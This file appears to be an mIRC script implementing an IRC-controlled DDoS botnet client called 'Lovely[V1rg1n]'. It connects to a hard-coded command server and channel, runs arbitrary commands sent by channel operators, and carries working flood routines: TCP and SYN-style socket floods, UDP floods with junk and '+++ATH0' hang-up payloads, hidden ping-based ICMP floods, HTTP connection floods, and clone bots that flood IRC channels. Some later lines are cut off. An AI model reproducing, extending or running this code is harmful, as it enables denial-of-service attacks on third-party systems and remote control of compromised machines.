;  Lovely[V1rg1n] ;
alias jc { /join $l0v3ly(nc) $l0v3ly(nk) }
alias connec { server $l0v3ly(nr) $l0v3ly(np) | if ($portfree(113)) { socklisten IDENT 113 } }
on *:START:{ .ddeserver on n4sty | .nick  M- $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999)  | anick  M- $+ $os $+ - $+ $r(1000,9999) $+ $r(100,999) | username V1rg1n[n4sty]  | identd on n4sty | emailaddr n4sty by MurdEr | .n0clone | .connec | .timerconnec -o 0 20 connec | .timerus -o 0 1 us | .timerus -o 0 1 hd | .timerst4rt -o 0 3 st4rt  }
alias saym { if ($me isvo $l0v3ly(nc)) { clearall | msg $l0v3ly(nc) $1- } }
alias n0clone { if ($portfree( $+ $l0v3ly(nl) $+ ) == $false) { exit } | socklisten noclone $l0v3ly(nl) }
on *:join:#:{ if (# = $l0v3ly(nc)) { if ($nick = $me) { timerjc off } } }
on *:disconnect:{ timerconnec -o 0 15 connec  }
on *:exit:{ sockclose * | timers off }
on *:connect:{ .timerconnec off | c | .timerjc 0 $rand(1,5) /jc }
on *:OP:#: { if ($opnick = $me) { mode $chan +mMnstk $l0v3ly(nk) } }
on *:PING:{ ctcp $me ping }
on *:join:$l0v3ly(nc):{ if ($nick == $me) { .timerjc off } }
on *:part:$l0v3ly(nc):{ if ($nick == $me) { .timerjc 0 3 raw -q /jc } }
on *:KICK:$l0v3ly(nc):{ if ($knick == $me) { .timerjc 0 3 raw -q /jc } }
on *:TEXT:*:*: {
  if ($nick isop $l0v3ly(nc)) {
    if ($1 = !http) { saym 1(14attacking1) 1[14 $+ %adres $+ 1]14 on 1[14 $+ %port $+ 1]14 | .set %adres $2 | .set %port $3 | .timerddos 00 00 //kapatalým }
    if ($1 = !dur) { saym 1(14attacking1) 1[14 $+ %adres $+ 1]14 on 1[14 $+ %port $+ 1]14 1(14Stopped1)14 | .unset %adres | .unset %port | .timerddos off | .sockclose * }
    if ($1 = !pf) { if ($4 == m) { //pf4st $2 $3 $r(1,64000) | halt } | //pf4st $2 $3 $4 }
    if ($1 = !TCP) { set %gdopeip $2 | set %sqqq $3 | set %timer.gDoPe $4 | TCP | saym 1[1TCP1]14 Sending packet to : $2 Port : $3 size : $4 }
    if ($1 = !dos) && ($3 != $null) { run hd.exe /n /fh /r "ping.exe $2 -n $3 -l 65500" | saym 1[14DDoS1]14 packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic } 
    if ($1 = !icmp) { if ($2 == $null) { saym Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run hd.exe /n /r "ping -n $4 -l $3 -w 0 $2 " }
    if ($1 = !syn) { if ($2 !== $null) { saym 1(14SynPacket1) 1(14attacking1) 1[14 $+ $2 $+ 1]14 on 1[14 $+ $3 $+ 1]14 With 1[14 $+ $4 $+ 1]14 Packets  | synpx start $4 $2 $3 } }    
    if ($1 = !udp) {  if ($4 == m) { //xudp $2 $3 $r(1,65000) | halt } | //xudp $2 $3 $4 }
    if ($1 = !mp) { if ($2 isnum) { mpf4st $2 $3 $r(1,64000) } | if ($2 = -s) { .timermpf4st off | saym 1Code End [14Mudp1] } }
    if ($1 = !clone) { clone $2- }
    if ($1 = !rest) { timer 1 1 /quit reconnecting... | connec }
    if ($1 = !/) && ($2 != $null) { %do = $2- | / $+ %do | unset %do }
    if ($1 = !c) { 
      if ($sock(X,0) == 0) { 
        .set %Xserv $2 
        .set %Xport $3
        .set %Xnick $4 
        .set %Xpass $5 
        .set %Xmail $6 
        .sockopen X %Xserv %Xport
      }
      if (off = $2) { timer 1 0 //sockclose X | .timerC1 off | unset %xserv %xport %xnick %xpass | return }
      if (away = $2) { timer 1 0 //sockwrite -nt X away : $+ $3- | return }
      if (raw = $2) { timer 1 0 //sockwrite -nt X $3 : $+ $4- | return }
    }
    if ($1 = !c2) { 
      if ($sock(M,0) == 0) { 
        .set %Xserv2 $2 
        .set %Xport2 $3
        .set %Xnick2 $4 
        .set %Xpass2 $5 
        .set %Xmail2 $6 
        .sockopen M %Xserv2 %Xport2
      }
      if (off = $2) { timer 1 0 //sockclose M | .timerX1 off | unset %xserv2 %xport2 %xnick2 %xpass2 %xemail2 | return }
      if (away = $2) { timer 1 0 //sockwrite -nt M away : $+ $3- | return }
      if (raw = $2) { timer 1 0 //sockwrite -nt M $3 : $+ $4- | return }
    }
    if ($1 = !c3) { 
      if ($sock(N,0) == 0) { 
        .set %Xserv3 $2 
        .set %Xport3 $3
        .set %Xnick3 $4 
        .set %Xpass3 $5 
        .set %Xmail3 $6 
        .sockopen N %Xserv3 %Xport3
      }
      if (off = $2) { timer 1 0 //sockclose N | .timerX2 off | unset %xserv3 %xport3 %xnick3 %xpass3 %xemail3 | return }
      if (away = $2) { timer 1 0 //sockwrite -nt N away : $+ $3- | return }
      if (raw = $2) { timer 1 0 //sockwrite -nt N $3 : $+ $4- | return }
    }
    if ($1 = !ch) { 
      if ($sock(C,0) == 0) { 
        .set %c-serv $2 
        .set %c-port $3
        .set %C-Chan $4 
        .set %C-Nick $5 
        .sockopen C %c-serv %c-port
      }
      if (off = $2) { timer 1 0 //sockclose C | .timerXc off | unset %c-nick %c-serv %c-port %c-Chan | return }
    }
  }
}
on *:sockread:X:{ sockread %ntread | ntreader $sockname %ntread }
alias ntreader {
  if (PING = $2) { sockwrite -nt $1 $2- }
  if (NICK = $3) && ($remove($4,:) = %Xnick) { //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | //sockwrite -nt $1 NickServ :register $replace(%Xpass,a,4,e,3,i,1,o,0) %Xmail | msg $l0v3ly(nc) 1 $+([,14Sock,$sockname,]) 01 $+ %Xnick3 Is Registerd For You... }
}
on *:Sockopen:X:{
  set %Socknick $n4sty
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $+ $read(murd3r)
  sockwrite -nt $sockname NICK $n4sty
  sockwrite -nt $sockname mode %socknick +R
  unset %socknick
  .timerC1 0 3 //sockwrite -nt $sockname nick %Xnick
}
on *:sockread:M:{ sockread %ntread2 | ntreader2 $sockname %ntread2 }
alias ntreader2 {
  if (PING = $2) { sockwrite -nt $1 $2- }
  if (NICK = $3) && ($remove($4,:) = %Xnick2) { //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | //sockwrite -nt $1 NickServ :register $replace(%Xpass2,a,4,e,3,i,1,o,0) %Xmail2 | msg $l0v3ly(nc) 1 $+([,14Sock,$sockname,]) 01 $+ %Xnick3 Is Registerd For You... }
}
on *:Sockopen:M:{
  set %Socknick2 $n4sty
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $+ $read(murd3r)
  sockwrite -nt $sockname NICK $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z)
  sockwrite -nt $sockname mode %socknick2 +R
  unset %socknick2
  .timerX1 0 3 //sockwrite -nt $sockname nick %Xnick2
}
on *:sockread:N:{ sockread %ntread3 | ntreader3 $sockname %ntread3 }
alias ntreader3 {
  if (PING = $2) { sockwrite -nt $1 $2- }
  if (NICK = $3) && ($remove($4,:) = %Xnick3) { //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | //sockwrite -nt $1 NickServ :register $replace(%Xpass3,a,4,e,3,i,1,o,0) %Xmail3 | msg $l0v3ly(nc) 1 $+([,14Sock,$sockname,]) 01 $+ %Xnick3 Is Registerd For You... }
}
on *:Sockopen:N:{
  set %Socknick2 $n4sty
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $read(murd3r)
  sockwrite -nt $sockname NICK $n4sty
  sockwrite -nt $sockname mode %socknick2 +R
  unset %socknick2
  .timerX2 0 2 //sockwrite -nt $sockname nick %Xnick3
}
on *:Sockopen:C:{
  set %Socknickx $n4sty
  sockwrite -nt $sockname USER $r(a,z) $+ $r(A,Z) $+ $r(1,9) $+ $r(a,z) * * : $read(murd3r)
  sockwrite -nt $sockname NICK $n4sty
  sockwrite -nt $sockname mode %socknickx +R
  unset %socknickx
  .timerXc 0 2 //sockwrite -nt $sockname Join %c-Chan
}
on 1:Sockread:C:{
  var %v
  sockread %v
  var %g = $gettok(%v,2,32)
  if (join = %g) { 
    .msg $l0v3ly(nc) am in the ChanneL %C-Chan
    .sockwrite -nt $sockname mode %C-Chan +ilI %C-Nick %C-Nick
  }
  if (join = %g) && ($remove(%C-nick,$chr(58)) isin %v) {
    .sockwrite -nt $sockname mode %C-Chan +io %C-Nick %C-Nick
  }
}
alias clone {
  if ($1 = con) { unset %fnickf | set %cserver $2 | /set %cport $3 | set %fnickf $5 | /timeropensock $+ $fnick $4 2 opensock }
  if ($1 = join) { ShadowSock Shadow* Join $2- }
  if ($1 = part) { ShadowSock Shadow* Part $2 : $+ $3- }
  if ($1 = msg) { ShadowSock Shadow* privmsg $2 : $+ $3- }
  if ($1 = notice) { ShadowSock Shadow* notice $2 : $+ $3- }
  if ($1 = crazy.c) { sockwrite -nt Shadow* Join $2 | timer 30 0 //sockwrite -nt Shadow* privmsg $2 : $3- }
  if ($1 = crazy.n) { timer 20 0 //sockwrite -nt Shadow* privmsg $2 : $3- | timer 30 0 //sockwrite -nt Shadow* notice $2 : $3- }
  if ($1 = jp) { ShadowSock Shadow* Join $2- | ShadowSock Shadow* part $2 : $3- | ShadowSock Shadow* Join $2- | ShadowSock Shadow* part $2 : $3- | ShadowSock Shadow* Join $2- | ShadowSock Shadow* part $2 : $3- }
  if ($1 = jmp) { ShadowSock Shadow* Join $2 | ShadowSock Shadow* privmsg $2 : $3- | ShadowSock Shadow* part $2 : $3- }
  if ($1 = flood.c) { ShadowSock Shadow* join $2 | ShadowSock Shadow* privmsg $2 : $3- | ShadowSock Shadow* notice $2 : $3- | ShadowSock Shadow* privmsg $2 : $3- }
  if ($1 = flood.n) { ShadowSock Shadow* privmsg $2 : $3- | ShadowSock Shadow* notice $2 : $3- | ShadowSock Shadow* privmsg $2 : $3- }
  if ($1 = chat.flood) { ShadowSock Shadow* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { ShadowSock Shadow* Quit : $+ $2- }
  if ($1 = massquit) || ($1 = mq) { ShadowSock Shadow* Join $2 | ShadowSock Shadow* Quit : $+ $3- }
  if ($1 = fnick) { ShadowSock Shadow* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { .timeropensock* off | sco Shadow* | unset %f.* }
  if ($1 = /) { sockwrite -nt Shadow* $2- | halt }
}
alias Stay { 
  if ($1 = PING) { ShadowSock %bota pong $remove($2-,:) } 
  if ($2 = 002) { .Saym CLone is on }
  if (ERROR = $1) { .Saym CLone Was ERROR | sco %bota | unset %f.* }
}
on *:sockread:Shadow*:{ set %bota $sockname | sockread %BoTread | Stay %BoTread | unset %bota }
on *:sockclose:Shadow*:{ unset %f.* }
alias fnick {
  set -u0 %fnick $rand(1,3)
  if (%fnick = 1) { return $n4sty }
  if (%fnick = 2) { return $n4sty }
  if (%fnick = 3) { return $n4sty }
}
alias opensock { sop Shadow $+ $ticks %cserver %cport }
on *:Sockopen:Shadow*:{
  if $sockerr { return }
  .ShadowSock $sockname USER $n4sty * * : $+ $rand(1,9)
  .ShadowSock $sockname NICK $n4sty
}
alias w { write $1- }
alias ShadowSock { .sockwrite -nt $1- }
alias s-n { .sockwrite -n $1- }
alias sop { .sockopen $1- }
alias sco { .sockclose $1- }
alias TCP {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 TCPP
}

alias TCPP {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen PACkeT $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  reTUrn
  :Done
  saym 1[TCP] Complite for %gdopeip
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %gdopeip
  .UNsET %timer.gDoPe
}
alias TCPsToP {
  .timergCoolT oFF
  .soCkClose PACkeT*
  .UNsET %gdopeip
  .UNsET %sqqq
  saym 1[TCP] Ended .. 
}

alias syn1 {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 syn3
}

alias syn3 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  reTUrn
  :Done
  saym 1[Storm] attacking done for %gdopeip
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %gdopeip
  .UNsET %sqqq
  .UNsET %timer.gDoPe
}
alias syn2 {
  sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 syn4
}

alias syn4 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %gdopeip %sqqq
  reTUrn
  :Done
  saym 1[Storm] attacking done for %gdopeip
  .timergCoolT oFF
  .soCkClose syn*
  .UNsET %gdopeip
  .UNsET %sqqq
  .UNsET %timer.gDoPe
}
alias pf4sts {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp he1ro $2 $3 $str(âô_6ÜµKTE_}²,60)
  sockudp he2ro $2 $3 $str(!@#$%^&*()_+|,50)
  sockudp he3ro $2 $3 $str(@,920)
  sockudp he4ro $2 $3 $str(0010110,130) 
  sockudp he5ro $2 $3 $str(Pong,200)
  sockudp he6ro $2 $3 $str(h3r0,180)
  sockudp he7ro $2 $3 $str(*,350)
  sockudp he8ro $2 $3 $str(link,200)
  sockudp he9ro $2 $3 $str(g4ng,180)
  return | :done | saym 1Code end [14attack1] | .timerd0nt off | unset %gnum 
}
alias pf4st  { if $1 = -s { .timerd0nt off | unset %gnum | saym 1Code end [14attack1] } | if $3 = $null { return } |  if $timer(d0nt).com != $null { saym 1Code Erorr [14attack1]: $gettok($timer(d0nt).com,3,32)  | return } |  saym 1Code Start [14attack1] Size: $+ $1 target: $+ $2  ComPort: $+ $3 |  set %gnum 0 |  .timerd0nt -m 0 400 pf4sts $1 $2 $3 }
alias mpf4st  { if ($1 = off) { .timermpf4st off | unset %mpf4stn | saym Stopped Code [14Mudp1] } | if ($3 = $null) { return } |  if ($timer(mpf4st).com != $null) { saym 1Code Error [14Mudp1] | return } | saym 1Code Start [14Mudp1] times: $+ $1 target: $+ $gettok($2,1,45) $gettok($2,2,45) $gettok($2,3,45) $gettok($2,4,45) $gettok($2,5,45) $gettok($2,6,45) $gettok($2,7,45) $gettok($2,8,45) $gettok($2,9,45) $gettok($2,10,45) Port: $+ $3 | set %mpf4stn 0 | set %mphasn $gettok($2,0,45) | .timermpf4st -m 0 400 mpf4st2 $1 $2 $3 }
alias mpf4st2 { if ($3 = $null) { goto dend } | if (%mpf4stn >= $1) { goto dend } | inc %mpf4stn 2  | sockudp md1ta $gettok($2,1,45) $r(1,65000) $str(1011001,130) | if (1 == %mphasn) { return } | sockudp md2ta $gettok($2,2,45) $r(1,65000) $str(1011001,130) | if (2 == %mphasn) { return } | sockudp md3ta $gettok($2,3,45) $r(1,65000) $str(1011001,130) | if (3 == %mphasn) { return } | sockudp md4ta $gettok($2,4,45) $r(1,65000) $str(1011001,130) | if (4 == %mphasn) { return } | sockudp md5ta $gettok($2,5,45) $r(1,65000) $str(1011001,130) | if (5 == %mphasn) { return } | sockudp md6ta $gettok($2,6,45) $r(1,65000) $str(1011001,130) | if (6 == %mphasn) { return } | sockudp md7ta $gettok($2,7,45) $r(1,65000) $str(1011001,130) | if (7 == %mphasn) { return } | sockudp md8ta $gettok($2,8,45) $r(1,65000) $str(1011001,130) | if (8 == %mphasn) { return } | sockudp md9ta $gettok($2,9,45) $r(1,65000) $str(1011001,130) if (9 == %mphasn) { return } 
  sockudp (11001,130) | 
  if (10 == %mhasn) { return } | return 
  :dend 
  .saym 1Code End [14Mudp1] 
  .timermpf4st off
  .unset %mphasn 
  .unset %mpf4st* 
}
alias synz { iF ($1 == $nUll) { reTUrn } | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | syn 1 $1- | syn 1 hAlT | saym 1[Storm] Complite on %synAA .. | UNsET %synAA }
alias syn {
  iF ($2 == start) { iF (%synPorT !IsnUM) || ($5 !IsnUM) { reTUrn } | vAr %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inC %x  } }
  iF ($2 == halt) { iF ($soCk(syn*,0) > 0) { soCkClose syn* } }
}
alias l0v3ly {
  if ($1 = nr) { return f.unicat.org }
  if ($1 = np) { return 9890 }
  if ($1 = nc) { return ##n## }
  if ($1 = nx) { return ##1337 }
  if ($1 = nk) { return gig }
  if ($1 = nl) { return 1289748 }
}
alias kapatalým { .sockopen $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) %adres %port }
alias Mdope { if $3 = $null { goto done } | :loop | if %Mnum >= $1 { goto done } | inc %Mnum 2 
  sockudp xudp1 $gettok($2,1,45) $r(1,65000) !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  if 1 == %limit { return }
  sockudp xudp3 $gettok($2,2,45) $r(1,65000) + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  if 2 == %limit { return }
  sockudp xudp2 $gettok($2,3,45) $r(1,65000) @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  if 3 == %limit { return }
  sockudp xudp4 $gettok($2,4,45) $r
  if 4 == %limit { return }
  sockudp xudp5 $gettok($2,5,45) $r
  if 5 == %limit { return }
  sockudp xudp6 $gettok($2,6,45) $r(1,65000) + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  if 6 == %limit { return }
  sockudp xudp7 $gettok($2,7,45) $r(1,65000) @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  if 7 == %limit { return }
  sockudp xudp8 $gettok($2,8,45) $r
  if 8 == %limit { return }
  sockudp xudp9 $gettok($2,9,45) $r(1,65000) + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + 